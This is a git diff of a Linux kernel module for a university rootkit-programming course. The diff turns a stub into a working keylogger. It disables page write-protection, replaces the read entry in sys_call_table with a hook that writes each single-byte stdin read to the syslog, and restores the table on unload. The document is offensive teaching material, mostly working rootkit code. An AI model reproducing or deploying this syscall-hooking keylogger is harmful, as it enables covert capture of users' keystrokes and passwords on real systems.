@@ -1,24 +1,34 @@
 /*
- * Assignment 01 for the course Rootkit Programming at TUM in WS2014/15.
+ * Assignment 02 for the course Rootkit Programming at TUM in WS2014/15.
  * Implemented by Guru Chandrasekhara and Martin Herrmann
  */
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <asm/page.h>
 #include "sysmap.h"
+#include <linux/moduleparam.h>
+#include <linux/unistd.h>
 
 void **sys_call_table;
 
-asmlinkage ssize_t (*original_read) (unsigned int fd, void *buf, size_t count);
+asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);
 
 /*
  * Our manipulated read syscall. It will print every keystroke to the syslog
  * and call the original read afterwards.
  */
-asmlinkage ssize_t manipulated_read(unsigned int fd, void *buf, size_t count)
+
+
+asmlinkage long manipulated_read(unsigned int fd, char __user *buf, size_t count)
 {
-	// TODO: implement the keylogger
-	return original_read(fd, buf, count);
+	long ret;
+	ret = original_read(fd,buf,count);
+	
+	//read from stdin and print it using printk
+	if(count == 1  && fd==0)
+		printk(KERN_INFO "0x%02x",buf[0]);
+	
+	return ret;
 }
 
 /*
@@ -59,13 +69,17 @@ int init_module(void)
 	
 	/* get the location of the sys_call_table from our sysmap.h file */
 	sys_call_table = (void*) sysmap_sys_call_table;
-
+	
 	/* disable the write-protection */
 	disable_page_protection();
 	
-	// TODO
-	//original_call = sys_call_table[];
-
+	/* 
+	 * keep pointer to original function in original_read, and 
+	 * replace the system call in the system call table with
+	 * manipulated_read 
+	 */
+	original_read = (void *)sys_call_table[__NR_read];
+	sys_call_table[__NR_read] = (unsigned long*)manipulated_read;
 	
 	/* reenable the write-protection */
 	enable_page_protection();	
@@ -79,4 +93,11 @@ int init_module(void)
 void cleanup_module(void)
 {
 	printk(KERN_INFO "Unloading keylogger... bye!\n");
+	
+	disable_page_protection();
+
+	/* Return the system call back to original */
+	sys_call_table[__NR_read] = (unsigned long *)original_read;
+
+	enable_page_protection();	
 }
